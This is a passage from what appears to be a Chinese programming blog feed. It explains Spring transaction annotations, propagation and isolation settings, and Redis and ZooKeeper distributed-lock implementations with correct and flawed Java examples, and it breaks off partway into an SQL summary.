id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h3><p>（1）@Transactional 只能被应用到public方法上, 对于其它非public的方法,如果标记了@Transactional也不会报错,但方法没有事务功能<br />（2）用Spring事务管理器，由Spring来负责数据库的打开、提交、回滚，默认遇到运行期例外(<code>throw new RuntimeException;</code>)会回滚，即遇到不受检查unchecked的例外时回滚，而遇到需要捕获的例外(<code>throw new Exception;</code>)不会回滚，即遇到受检查的例外(就是非运行时抛出的异常，编译器会检查到的异常叫受检查例外或说受检查异常)时，需我们指定方式来让事务回滚，要想所有异常都回滚，要加上<code>@Transactional(rollbackFor={Exception.class,其它异常})</code>，如果让unchecked例外不回滚，要加上<code>@Transactional(notRollbackFor=RunTimeException.class)</code><br />（3）@Transactional 注解应该只被应用到 public 可见度的方法上。 如果你在 protected、private 或者 package-visible 的方法上使用 @Transactional 注解，它也不会报错， 但是这个被注解的方法将不会展示已配置的事务设置<br />（4）@Transactional 注解可以被应用于接口定义和接口方法、类定义和类的 public 方法上。然而，请注意仅仅 @Transactional 注解的出现不足于开启事务行为，它仅仅是一种元数据，能够被可以识别 @Transactional 注解和上述的配置适当的具有事务行为的beans所使用。上面的例子中，其实正是&lt;tx:annotation-driven/&gt;元素的出现 开启了事务行为<br />（5）Spring团队的建议是在具体的类（或类的方法）上使用@Transactional注解，而不是使用在类所要实现的任何接口上。可以在接口上使用 @Transactional 注解，但是这将只能当你设置基于接口的代理时它才生效。因为接口是<strong>不能继承</strong>的的，这就意味着如果正在使用基于类的代理时，那么事务的设置将不能被基于类的代理所识别，而且对象也将不会被事务代理所包装。因此，请接受Spring团队的建议并且在具体的类上使用 @Transactional 注解</p><h2 id="使用aop的方式实现事务的配置"><a class="markdownIt-Anchor" href="#使用aop的方式实现事务的配置"></a> 使用AOP的方式实现事务的配置</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 定义事务管理器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"transactionManager"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">"org.springframework.jdbc.datasource.DataSourceTransactionManager"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 下面使用aop切面的方式来实现 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">"TestAdvice"</span> <span class="attr">transaction-manager</span>=<span class="string">"transactionManager"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--配置事务传播性，隔离级别以及超时回滚等问题 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"save*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"del*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"update*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"add*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"*"</span> <span class="attr">rollback-for</span>=<span class="string">"Exception"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--配置事务切点 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">"services"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">expression</span>=<span class="string">"execution(* com.website.service.*.*(..))"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">pointcut-ref</span>=<span class="string">"services"</span> <span class="attr">advice-ref</span>=<span class="string">"TestAdvice"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>AOP配置的属性如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">"advice"</span> <span class="attr">transaction-manager</span>=<span class="string">"txManager"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- tx:method的属性:</span></span><br><span class="line"><span class="comment"> - name是必须的，表示与事务属性关联的方法名，对切入点进行细化。通配符*可以用来指定一批关联到相同的事务属性的方法。如get*、handle*、on*Event等等</span></span><br><span class="line"><span class="comment">- propagation不是必须的，默认值是REQUIRED，表示事务的传播行为，包括REQUIRED,SUPPORTS,MANDATORY,REQUIRES_NEW,NOT_SUPPORTED,NEVER,NESTED</span></span><br><span class="line"><span class="comment">- isolation 不是必须的，默认值DEFAULT，表示事务隔离级别（数据库的隔离级别）</span></span><br><span class="line"><span class="comment">- timeout 不是必须的，默认值-1（永不超时），表示事务超时的时间（以秒为单位）</span></span><br><span class="line"><span class="comment">- read-only 不是必须的，默认值false不是只读的，表示事务是否只读？</span></span><br><span class="line"><span class="comment">- rollback-for 不是必须的，表示将被触发进行回滚的Exception(s)以逗号分开</span></span><br><span class="line"><span class="comment">- no-rollback-for 不是必须的，表示不被触发进行回滚的Exception(s)以逗号分开</span></span><br><span class="line"><span class="comment">任何RuntimeException将触发事务回滚，但是任何checked Exception将不触发事务回滚</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"save*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">isolation</span>=<span class="string">"DEFAULT"</span> <span class="attr">read-only</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"update*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">isolation</span>=<span class="string">"DEFAULT"</span> <span class="attr">read-only</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"delete*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">isolation</span>=<span class="string">"DEFAULT"</span> <span class="attr">read-only</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 其他的方法之只读的 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"*"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="spring事务"><a class="markdownIt-Anchor" href="#spring事务"></a> Spring事务</h2><h3 id="spring事务的几种传播特性"><a class="markdownIt-Anchor" href="#spring事务的几种传播特性"></a> Spring事务的几种传播特性</h3><ul><li>PROPAGATION_REQUIRED：如果存在一个事务，则支持当前事务，如果没有事务则开启</li><li>PROPAGATION_SUPPORTS：如果存在一个事务，支持当前事务。如果没有事务，则非事务的执行</li><li>PROPAGATION_MANDATORY：如果存在一个事务，支持当前事务，如果没有一个活动事务，则抛出异常</li><li>PROPAGATION_REQUIRES_NEW：总是开启一个新的事务，如果一个事务已经存在，则将这个存在的事务挂起</li><li>PROPAGATION_NOT_SUPPORTED：总是非事务地执行，并挂起任何存在的事务</li><li>PROPAGATION_NEVER：总是非事务地执行，如果存在一个活动事务，则抛出异常</li><li>PROPAGATION_NESTED：如果一个活动的事务存在，则运行在一个嵌套的事务中。如果没有活动事务，则按TransactionDefinition.PROPAGATION_REQUIRED属性执行</li></ul><h3 id="spring事务的隔离级别"><a class="markdownIt-Anchor" href="#spring事务的隔离级别"></a> Spring事务的隔离级别</h3><ul><li>ISOLATION_DEFAULT：这是一个PlatfromTransactionManager默认的隔离级别，使用数据库默认的事务隔离级别，另外四个与JDBC的隔离级别相对应</li><li>ISOLATION_READ_UNCOMMITTED：这是事务最低的隔离级别，它允许另外一个事务可以看到这个事务未提交的数据，这种隔离级别会产生脏读，不可重复读和幻读</li><li>ISOLATION_READ_COMMITTED：保证一个事务修改的数据提交后才能被另外一个事务读取。另外一个事务不能读取该事务未提交的数据</li><li>ISOLATION_SERIALIZABLE：这是花费最高代价但是最可靠的事务隔离级别。事务被处理为顺序执行,除了防止脏读，不可重复读外，还避免了幻像读</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
            <tag> Spring事务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式锁</title>
      <link href="/distributed-lock/"/>
      <url>/distributed-lock/</url>
      
        <content type="html"><![CDATA[<p>分布式锁，是用来控制分布式系统中互斥访问共享资源的一种手段，从而避免并行导致的结果不可控。</p><p>基本的实现原理和单进程锁是一致的，通过一个共享标识来确定唯一性，对共享标识进行修改时能够保证原子性和和对锁服务调用方的可见性。</p><p>为了确保分布式锁可用，至少要确保锁的实现同时满足以下四个条件：</p><ul><li><strong>互斥性</strong>：在任意时刻，只有一个客户端能持有锁</li><li><strong>不会发生死锁</strong>：即使有一个客户端在持有锁的期间奔溃而没有主动解锁，也能保证后续其他客户端能加锁</li><li><strong>具有容错性</strong>：只要大部分的Redis节点正常运行，客户端就可以加锁和解锁</li><li><strong>解铃还须系铃人</strong>：加锁和解锁必须是同一个客户端，客户端自己不能把别人加的锁给解了</li></ul><h2 id="基于redis实现的锁服务"><a class="markdownIt-Anchor" href="#基于redis实现的锁服务"></a> 基于Redis实现的锁服务</h2><h3 id="加锁代码"><a class="markdownIt-Anchor" href="#加锁代码"></a> 加锁代码</h3><h4 id="正确姿势"><a class="markdownIt-Anchor" href="#正确姿势"></a> 正确姿势</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisTool</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LOCK_SUCCESS = <span class="string">"OK"</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SET_IF_NOT_EXIST = <span class="string">"NX"</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SET_WITH_EXPIRE_TIME = <span class="string">"PX"</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 尝试获取分布式锁</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jedis Redis客户端</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> lockKey 锁</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> requestId 请求标识</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> expireTime 超期时间</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 是否获取成功</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">tryGetDistributedLock</span><span class="params">(Jedis jedis, String lockKey, String requestId, <span class="keyword">int</span> expireTime)</span> </span>&#123;</span><br><span class="line">    String result = jedis.set(lockKey, requestId, SET_IF_NOT_EXIST, SET_WITH_EXPIRE_TIME, expireTime);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (LOCK_SUCCESS.equals(result)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，我们加锁就一行代码：<code>jedis.set(String key, String value, String nxxx, String expx, int time)</code>，这个set()方法一共有五个形参：</p><ul><li>第一个为key，我们使用key当锁，因为key是唯一的</li><li>第二个为value，我们传的是requestId，很多童鞋可能不明白，有key作为锁不就够了吗，为什么还要用到value？原因就是我们在上面讲到可靠性时，分布式锁要满足第四个条件<strong>解铃还须系铃人</strong>，通过给value赋值为requestId，我们就知道这把锁是哪个请求加的了。在解锁的时候就可以有依据。requestId可以使用<code>UUID.randomUUID().toString()</code>方法生成</li><li>第三个是nxxx，这个参数我们填的是NX，意思是SET IF NOT EXIST，即当key不存在时，我们进行set操作；若key已经存在，则不做任何操作</li><li>第四个是expx，这个参数我们传的是PX，意思是我们要给这个key加一个过期的设置，具体时间由第五个参数决定</li><li>第五个是time，与第四个参数相呼应，代表key的过期时间</li></ul><p>总的来说，执行上面的set()方法就只会导致两种结果：</p><ol><li>当前没有锁（key不存在），那么就进行加锁操作，并对锁设置个有效期，同时value表示加锁的客户端</li><li>已有锁存在，不做任何操作</li></ol><p>通过上述我们发现，加锁代码满足我们可靠性里描述的三个条件。<br />首先，set()加入了NX参数，可以保证如果已有key存在，则函数不会调用成功，也就是只有一个客户端能持有锁，满足互斥性；<br />其次，由于我们对锁设置了过期时间，即使锁的持有者后续发生崩溃而没有解锁，锁也会因为到了过期时间而自动解锁（即key被删除），不会发生死锁；<br />最后，因为我们将value赋值为requestId，代表加锁的客户端请求标识，那么在客户端在解锁的时候就可以进行校验是否是同一个客户端。</p><p>由于我们只考虑Redis单机部署的场景，所以容错性我们暂不考虑。</p><h4 id="错误示例1"><a class="markdownIt-Anchor" href="#错误示例1"></a> 错误示例1</h4><p>比较常见的错误示例就是使用<code>jedis.setnx()</code>和<code>jedis.expire()</code>组合实现加锁，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">wrongGetLock1</span><span class="params">(Jedis jedis, String lockKey, String requestId, <span class="keyword">int</span> expireTime)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  Long result = jedis.setnx(lockKey, requestId);</span><br><span class="line">  <span class="keyword">if</span> (result == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 若在这里程序突然崩溃，则无法设置过期时间，将发生死锁</span></span><br><span class="line">    jedis.expire(lockKey, expireTime);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>setnx()方法作用就是SET IF NOT EXIST，expire()方法就是给锁加一个过期时间。<em>然而这是两条Redis命令，不具有原子性</em>，如果程序执行完setnx()之后突然奔溃，导致锁没有设置超时时间，那么将会发生死锁。网上之所以有人这样实现，是因为低版本的jedis并不支持多参数的set()方法。</p><h4 id="错误示例2"><a class="markdownIt-Anchor" href="#错误示例2"></a> 错误示例2</h4><p>该种错误的实现思路如下：使用<code>jedis.setnx()</code>命令实现加锁，其中key是锁，value是锁的过期时间。执行过程如下：1. 通过setnx()方法实现加锁，如果当前锁不存在，返回加锁成功；2. 如果锁已经存在则获取锁的过期时间，和当前时间相比，如果锁已经过期，则设置新的过期时间，返回加锁成功。代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">wrongGetLock2</span><span class="params">(Jedis jedis, String lockKey, String requestId, <span class="keyword">int</span> expireTime)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> expires = System.currentTimeMillis() + expireTime;</span><br><span class="line">  String expireStr = String.valueOf(expires);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 如果当前锁不存在，返回加锁成功</span></span><br><span class="line">  <span class="keyword">if</span> (jedis.setnx(lockKey, expiresStr()) == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 如果锁存在，获取锁的过期时间</span></span><br><span class="line">  String currentValueStr = jedis.get(lockKey);</span><br><span class="line">  <span class="keyword">if</span> (currentValueStr != <span class="keyword">null</span> &amp;&amp; Long.parseLong(currentValueStr) &lt; System.currentTimeMillis()) &#123;</span><br><span class="line">    <span class="comment">// 锁已过期，获取上一个锁的过期时间，并设置现在锁的过期时间</span></span><br><span class="line">    String oldValueStr = jedis.getSet(lockKey, expiresStr);</span><br><span class="line">    <span class="keyword">if</span> (oldValueStr != <span class="keyword">null</span> &amp;&amp; oldValueStr.equals(currentValueStr)) &#123;</span><br><span class="line">      <span class="comment">// 考虑多线程并发的情况，只有一个线程的设置值和当前值相同，它才有权利加锁</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 其他情况，一律返回加锁失败</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码问题如下：</p><ol><li>由于是客户端自己生成过期时间，所以需要强制要求分布式下每个客户端的时间必须同步</li><li>当锁过期的时候，如果多个客户端同时执行<code>jedis.getSet()</code>方法，那么虽然最终只要一个客户端可以加锁，但是这个客户端的锁的过期时间可能被其他客户端覆盖</li><li>锁不具备拥有者标识，即任何客户端都可以加锁</li></ol><h3 id="解锁代码"><a class="markdownIt-Anchor" href="#解锁代码"></a> 解锁代码</h3><h4 id="正确姿势-2"><a class="markdownIt-Anchor" href="#正确姿势-2"></a> 正确姿势</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisTool</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Long RELEASE_SUCCESS = <span class="number">1L</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 释放分布式锁</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jedis Redis客户端</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> lockKey 锁</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> requestId 请求标识</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 是否释放成功</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">releaseDistributedLock</span><span class="params">(Jedis jedis, String lockKey, String requestId)</span> </span>&#123;</span><br><span class="line">    String script =<span class="string">"if redis.call('get', KEYS[1]) == ARGV[1] then return redis.call('del', KEYS[1]) else return 0 end"</span>;</span><br><span class="line">    Object result = jedis.eval(script, Collections.singletonList(lockKey), Collections.singletonList(requestId));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (RELEASE_SUCCESS.equals(result)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，我们解锁只需要两行代码就搞定了！第一行代码，我们写了一个简单的Lua脚本代码;第二行代码，我们将Lua代码传到<code>jedis.eval()</code>方法里，并使参数KEYS[1]赋值为lockKey，ARGV[1]赋值为requestId。eval()方法是将Lua代码交给Redis服务端执行。</p><p>那么这段Lua代码的功能是什么呢？其实很简单，首先获取锁对应的value值，检查是否与requestId相等，如果相等则删除锁（解锁）。那么为什么要使用Lua语言来实现呢？因为要确保上述操作是原子性的 。那么为什么执行eval()方法可以确保原子性，源于Redis的特性，下面是官网对eval命令的部分解释：</p><p><strong>简单来说，就是在eval命令执行Lua代码的时候，Lua代码将被当成一个命令去执行，并且直到eval命令执行完成，Redis才会执行其他命令。</strong></p><h4 id="错误示例1-2"><a class="markdownIt-Anchor" href="#错误示例1-2"></a> 错误示例1</h4><p>最常见的解锁代码就是直接使用<code>jedis.del()</code>方法删除锁，这种不先判断锁的拥有者而直接删除锁的方式，会导致任何客户端都可以随时进行解锁，即使这把锁不是它的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">wrongReleaseLock1</span><span class="params">(Jedis jedis, String lockKey)</span> </span>&#123;</span><br><span class="line">    jedis.del(lockKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="错误示例2-2"><a class="markdownIt-Anchor" href="#错误示例2-2"></a> 错误示例2</h4><p>这种解锁代码与之前的差不多，唯一区别的是分成两条命令去执行，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">wrongReleaseLock2</span><span class="params">(Jedis jedis, String lockKey, String requestId)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 判断解锁与加锁是不是同一个客户端</span></span><br><span class="line">  <span class="keyword">if</span> (requestId.equals(jedis.get(lockKey))) &#123;</span><br><span class="line">    <span class="comment">// 若在此时，这把锁突然不是这个客户端的，则会误解锁</span></span><br><span class="line">    jedis.del(lockKey);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如代码注释，问题在于如果调用<code>jedis.del()</code>方法的时候，这把锁已经不属于当前客户端的时候会解除他人加的锁。那么是否真的有这种场景？答案是肯定的，比如客户端A加锁，一段时间之后客户端A解锁，在执行<code>jedis.del()</code>之前，锁突然过期了，此时客户端B尝试加锁成功，然后客户端A再执行del()方法，则将客户端B的锁给解除了。</p><h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3><p>通过过期时间来避免死锁，过期时间设置多长对业务来说往往比较头疼，时间短了可能会造成：持有锁的线程A任务还未处理完成，锁过期了，线程B获得了锁，导致同一个资源被A、B两个线程并发访问；时间长了会造成：持有锁的进程宕机，造成其他等待获取锁的进程长时间的无效等待。</p><p>Redis的主从异步复制机制可能丢失数据，会出现如下场景：A线程获得了锁，但锁数据还未同步到slave上，master挂了，slave顶成主，线程B尝试加锁，仍然能够成功，造成A、B两个线程并发访问同一个资源。</p><h2 id="基于zookeeper实现的锁机制"><a class="markdownIt-Anchor" href="#基于zookeeper实现的锁机制"></a> 基于ZooKeeper实现的锁机制</h2><h3 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h3><p>在单进程应用中，我们经常使用锁来保障多个线程并发访问同一资源的互斥性。在多进程、分布式环境下，如果多个系统或者单个系统的多个节点并发访问同一资源，为了保障对资源读写的互斥性，就需要用到分布式锁。</p><h3 id="为什么用zookeeper来实现分布式锁"><a class="markdownIt-Anchor" href="#为什么用zookeeper来实现分布式锁"></a> 为什么用Zookeeper来实现分布式锁</h3><p>Zookeeper能够保障分布式场景下数据的一致性、有序性、原子性及可靠性，它的所有写入操作会在Leader节点持久化，并在集群过半节点写入成功才会返回；它也能够支持节点的奔溃恢复以及客户端的最终一致性视图。对于分布式锁场景来说，数据一致性的保障、以及锁服务的容灾保障至关重要。</p><p>另外，Zookeeper还提供了三种在分布式锁场景下非常有用的特征（以下的节点指的是Zookeeper内部存储的znode节点）：</p><ul><li><p>临时节点<br />客户端可以指定zk创建一个临时节点，此节点将在这个客户端与服务端建立的session到期时自动删除，这个特性可以保障客户端创建的分布式锁节点宕机或者网络通讯中断一段时间后自动释放该临时节点，从而避免分布式锁由于客户端或网络原因导致的死锁问题</p></li><li><p>有序节点<br />客户端可以指定zk创建一个有序节点，此节点将自动在客户端指定的节点名后面添加一个单调递增序号来确保多个客户端同时创建相同的节点名时能够创建成功，并且保障越早创建的节点的序号越小。利用该特性可以实现锁的互斥性和公平性，即同一时刻只有一个客户端能够成功获取到锁（序号最小的一个获取到锁），获取锁失败的节点可以按照</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 锁 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lock </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL</title>
      <link href="/sql-summary/"/>
      <url>/sql-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="基础"><a class="markdownIt-Anchor" href="#基础"></a> 基础</h2><ol><li>DML语句：主要由insert、update和delete三个关键字组成</li><li>DDL语句：主要由create、alter、drop和truncate四个关键字组成</li></ol><h2 id="ddl语句"><a class="markdownIt-Anchor" href="#ddl语句"></a> DDL语句</h2><ol><li>增加列、修改列、删除列：add、modify、drop</li><li>删除表：drop table 表名;</li><li>truncate表：删除该表里的全部数据，但保留表结构；只能一次性删除整个表的全部记录；比delete删除速度要快</li><li>建立索引：create index 索引名 on 表名<br />索引的缺陷：<ul><li>当数据表中的记录被添加、删除、修改时，数据库系统需要维护索引，因此有一定的系统开销</li><li>存储索引需要一定的磁盘空间</li></ul></li><li>distinct去除重复记录</li></ol><h2 id="dml语句"><a class="markdownIt-Anchor" href="#dml语句"></a> DML语句</h2><ol><li>mysql使用concat进行字符串连接</li><li>SQL语句中的通配符：下划线代表一个任意的字符，百分号代表任意多个字符</li><li>数据库函数<ul><li>ifnull(expr1, expr2)，如果expr1为null，则返回expr2，否则返回expr1</li><li>nullif(expr1, expr2)，如果expr1和expr2相等，则返回null，否则返回expr2</li><li>if(expr1, expr2, 